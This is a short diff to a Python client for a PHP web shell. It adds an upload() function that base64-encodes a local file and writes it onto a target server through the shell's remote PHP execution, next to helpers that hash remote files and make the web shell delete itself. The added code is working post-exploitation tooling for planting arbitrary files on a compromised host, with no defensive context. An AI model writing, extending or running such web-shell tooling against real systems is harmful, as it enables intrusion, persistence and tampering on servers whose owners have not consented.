@@ -35,6 +35,26 @@ def hash_remote_file(ws: WebShell, path: str) -> str:
     return ws.run_php(f"echo md5(file_get_contents({php_string(path)}))").strip()
 
 
+def upload(ws: WebShell, local_path: str | Path, remote_path: str) -> bool:
+    """Upload a local file to ``remote_path`` on the target.
+
+    Fills a real gap — v1 shipped an empty ``upload_file.py`` stub. The bytes
+    are base64-encoded, so any binary content transfers intact.
+    """
+    data = Path(local_path).read_bytes()
+    encoded = base64.b64encode(data).decode()
+    code = (
+        f"echo file_put_contents({php_string(remote_path)}, base64_decode('{encoded}')) "
+        "!== false ? 'OK' : 'FAIL'"
+    )
+    ok = "OK" in ws.run_php(code)
+    if ok:
+        log.success(f"Uploaded {local_path} -> {remote_path} ({len(data)} bytes)")
+    else:
+        log.error(f"Upload failed: {remote_path}")
+    return ok
+
+
 def remove(ws: WebShell, path: str | None = None) -> bool:
     """Delete a remote file. With no ``path`` the webshell deletes *itself*.
 
